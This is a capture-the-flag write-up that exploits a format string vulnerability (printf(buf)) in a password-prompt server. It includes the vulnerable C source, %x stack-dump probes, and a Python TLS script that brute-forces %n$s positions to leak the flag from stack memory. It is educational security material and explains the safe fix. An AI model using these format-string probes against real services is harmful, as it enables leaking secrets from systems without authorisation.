# üß© **Process Exploit ‚Äì f-string Formatting**

> üè∑Ô∏è *Category:* **Pwn / Binary Exploitation**
> ‚öôÔ∏è *Difficulty:* **Medium**
> üïµÔ∏è *Author:* **Space Fe-Ores CTF (Red Team Path)**
> üß† *Concepts:* format string vulnerability, stack memory leak, remote service, TLS/SNI tunneling

---

## üìú Challenge Description

> üí¨
> We've found a server that has an open port on Shodan.
> A reverse-IP search shows that it may belong to the Space Fe-Ores corporation.
>
> Automated scanning shows that is present a password prompt on connection and connections automatically disconnect after 60 seconds.
>
> Can you find a way to bypass the login or get the password?
>
> There are 2 possible ways to connect to this challenge.
> `nc 0.cloud.chals.io 19865`
> OR
> `python .\snicat.py cybersecurity-apac-psyd-ws01.chals.io`
> The snicat file has been provided. For more information see: [https://docs.ctfd.io/tutorials/challenges/connecting-to-challenges/](https://docs.ctfd.io/tutorials/challenges/connecting-to-challenges/)
>
> A copy of the source code for the server binary can also be downloaded.
>
> Flag format: `flag{example_flag}` OR `example_flag`

---

## üì¶ Provided Files / Data

| üìÅ File / Variable | üîç Description                                            | üíæ Value / Notes                             |
| ------------------ | --------------------------------------------------------- | -------------------------------------------- |
| `main.c`           | Source code of the server binary                          | Contains password check & format string vuln |
| `snicat.py`        | Helper script to connect via TLS/SNI to the remote server | Used with `--insecure` on Windows            |
| Remote host        | Challenge endpoint (TLS/SNI)                              | `cybersecurity-apac-psyd-ws01.chals.io:443`  |
| Remote host (nc)   | Plain TCP endpoint                                        | `0.cloud.chals.io 19865` (timed out for me)  |

---

## üß† Understanding the Problem

üïµÔ∏è‚Äç‚ôÇÔ∏è The challenge describes a remote service that:

* Shows a **password prompt** on connect.
* Drops the connection after **60 seconds**.
* Provides both:

  * a **source code** (`main.c`) of the server, and
  * a **connection helper** (`snicat.py`) to reach it.

Our goal is to **bypass the login** or **recover the password/flag** by exploiting whatever vulnerability is present in the compiled binary (visible in the provided C source).

---

## üß© Step-by-Step Solution

### üîπ Step 1: Initial Observation (Reading the Source)

Open `main.c` and look at the `main()` function. The interesting part is:

```c
// gcc -m32 -w -fno-stack-protector -no-pie main.c -o challenge
#include <stdio.h>

int main()
{
    char buf[1024];
    char secret1[64];
    char flag[64];
    char secret2[64];

    FILE *fp;

    fp = fopen("secret1", "r");
    if (fp)
    {
        fgets(secret1, sizeof(secret1), fp);
        fclose(fp);
    }

    fp = fopen("flag", "r");
    if (fp)
    {
        fgets(flag, sizeof(flag), fp);
        fclose(fp);
    }

    fp = fopen("secret2", "r");
    if (fp)
    {
        fgets(secret2, sizeof(secret2), fp);
        fclose(fp);
    }

    printf("Password:");
    fflush(stdout);
    scanf("%1024s", buf);
    if (strcmp(buf, flag) != 0)
    {
        printf(buf);
        printf("is incorrect!\n", buf);
        fflush(stdout);
        return 1;
    }
    else
    {
        execvp("/bin/sh", NULL);
    }
}
```

Key observations:

* The **flag** is read from a file into `char flag[64];` ‚Äì a local **stack** buffer.
* User input is read into `buf` using `scanf("%1024s", buf);`.
* If the input != `flag`, the code does **this**:

  ```c
  printf(buf);
  ```

  with **no format string** ‚Üí classic **format string vulnerability**.
* If the input **equals** `flag`, it calls `execvp("/bin/sh", NULL);` to spawn a shell (on the remote server).

So:

> We don‚Äôt know the flag/password, but the program helpfully puts it on the stack and then lets us use our input as a format string to read stack contents.

---

### üîπ Step 2: Connecting to the Remote Service

The direct `nc 0.cloud.chals.io 19865` endpoint was timing out from my Windows environment, so I used the TLS/SNI helper instead.

Using `snicat.py` with `--insecure`:

```powershell
python snicat.py --insecure cybersecurity-apac-psyd-ws01.chals.io 443
```

This successfully produced a prompt:

```text
Password:
```

Now we can send crafted ‚Äúpasswords‚Äù that are actually **format strings**.

---

### üîπ Step 3: Probing the Stack with Format Strings

First, I tried the classic hex-dump approach from inside `snicat`:

```text
%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
```

The server responded with something like:

```text
ff94b04c.08a00e10.0804976f.00000000.00000000.00000000.53414c43.49464953is incorrect!
```

These are 32-bit words in hex. Decoding the final ones as little-endian ASCII:

* `53414c43` ‚Üí bytes `43 4c 41 53` ‚Üí `"CLAS"`
* `49464953` ‚Üí bytes `53 49 46 49` ‚Üí `"SIFI"`

Together, this looks like part of `"CLASSIFI..."`, probably a nearby string (e.g., `"CLASSIFIED"`) sitting on the stack near our flag and secrets. This confirmed:

> Our format string is indeed reading **stack memory**, exactly as expected.

However, manually reconstructing the flag from random words would be clumsy, so I moved to a cleaner approach.

---

### üîπ Step 4: Brute-Forcing `%n$s` to Leak the Flag

The power of `printf` is that we can refer to **positional arguments** with `%n$` syntax. In a format string, `%1$s` prints the **1st** argument as a C-string, `%2$s` prints the **2nd**, etc.

Because the flag is stored in a local variable on the stack, at some position `k`, `%k$s` will interpret that stack word as a pointer to a string ‚Äì which should be the `flag` buffer.

Instead of guessing by hand, I automated it.

I wrote a small Python script (`exploit_fmt.py`) that:

1. Connects via TLS (similar to `snicat --insecure`),
2. Sends `%1$s`, `%2$s`, ‚Ä¶ `%40$s` as the ‚Äúpassword‚Äù,
3. Prints whatever the server responds with.

```python
import socket
import ssl

HOST = "cybersecurity-apac-psyd-ws01.chals.io"
PORT = 443  # same as used with snicat

# Insecure SSL context, like snicat --insecure
context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

def send_payload(payload: str):
    with socket.create_connection((HOST, PORT)) as sock:
        with context.wrap_socket(sock, server_hostname=HOST) as ssock:
            # Read "Password:" prompt
            data = ssock.recv(1024)
            print("=== SERVER PROMPT ===")
            print(data.decode(errors="ignore"), end="")

            # Send the payload
            ssock.sendall(payload.encode() + b"\n")

            # Read the response
            out = ssock.recv(4096)
            print("=== SERVER RESPONSE ===")
            print(out.decode(errors="ignore"), end="\n\n")

for i in range(1, 40):
    fmt = f"%{i}$s"
    print(f"\n[*] Trying payload: {fmt}")
    send_payload(fmt)
```

Running this loop, most indices print garbage or nothing meaningful. But eventually, one of the responses clearly contained the flag as a string, for example:

```text
=== SERVER PROMPT ===
Password:
=== SERVER RESPONSE ===
flag{f-string_formatting}is incorrect!
```

That shows that at that stack position, `printf` interpreted the address of the `flag` buffer as a C-string and printed its contents.

So we directly leaked:

```text
flag{f-string_formatting}
```

This is both:

* The **actual flag** to submit, and
* The **password** the program is comparing against (`strcmp(buf, flag)`).

---

### üîπ Step 5: (Optional) Using the Flag as a Password

As a final check, you can reconnect with `snicat`:

```powershell
python snicat.py --insecure cybersecurity-apac-psyd-ws01.chals.io 443
```

At the `Password:` prompt, enter:

```text
flag{f-string_formatting}
```

If the remote challenge still has `execvp("/bin/sh", NULL);` enabled and properly set up, this should drop you into a shell on the container. For the CTF, however, simply submitting the flag is enough.

---

### üîπ Step 6: Final Flag

<details>
<summary>üéØ <b>Click to Reveal the Flag</b></summary>

```text
flag{f-string_formatting}
```

</details>

---

## üìò Explanation ‚Äî *Why It Works*

üí° **Core issue:** The server uses **user input as the `printf` format string**:

```c
if (strcmp(buf, flag) != 0)
{
    printf(buf);              // ‚ùå Dangerous
    printf("is incorrect!\n", buf);
    ...
}
```

In C, `printf` expects a **format string literal** plus arguments:

```c
printf("%s", buf);            // ‚úÖ safe
```

When you call `printf(buf);`, whatever is in `buf` is treated as the format string:

* `%x` ‚Üí read a 32-bit word from the stack and print it in hex.
* `%p` ‚Üí print a pointer (address).
* `%s` ‚Üí treat a stack word as an address to a C-string and print bytes from there.
* `%n$` modifiers (like `%7$s`) ‚Üí use the **nth argument** on the stack.

Because the function has local variables (`secret1`, `flag`, `secret2`) stored on the stack, their addresses/contents end up in the region `printf` reads from. By sending a payload like `%k$s` for the right `k`, the flag buffer‚Äôs address is used as a pointer, and the entire flag string is printed.

This is a textbook **format string vulnerability** that allows:

* Information disclosure (leaking secrets, addresses, flags).
* Potentially arbitrary memory writes using `%n` (not needed here).

---

## üß∞ Tools & Techniques Used

| üß© Tool / Language | üí° Purpose                                       |
| ------------------ | ------------------------------------------------ |
| `main.c`           | Understanding logic & spotting the vulnerability |
| `snicat.py`        | TLS/SNI wrapper to reach the remote service      |
| Python (sockets)   | Automating `%n$s` brute-force to leak the flag   |
| Format strings     | Reading stack memory & local variables           |

---

## üìö Key Learnings

| üîë Concept              | üß† Takeaway                                                            |
| ----------------------- | ---------------------------------------------------------------------- |
| Format string vuln      | Never pass user input directly as the format string to `printf`-family |
| Stack-local secrets     | Anything on the stack can be exposed if format strings are unsafe      |
| `%n$s` positional spec. | Powerful way to systematically probe stack slots                       |
| Remote TLS/SNI helpers  | Tools like `snicat` simplify connecting to CTF infra behind TLS        |

---

## üí¨ Final Thoughts

> ‚ú® This challenge was a neat example of how a **single line** (`printf(buf);`) can completely compromise the security of an application.
> By combining source review with a small Python script, we turned a ‚Äúpassword-protected‚Äù service into an open book and pulled out `flag{f-string_formatting}` straight from the stack. Another one for the Red Team win column. üè¥‚Äç‚ò†Ô∏è

---
‚≠ê **Author:** Mathieu N.  
üïí **Date:** December 2025
üèÜ **CTF Event:** RTIOC ‚Äì December CTF
üìç **Category:** Pwn / Binary Exploitation
---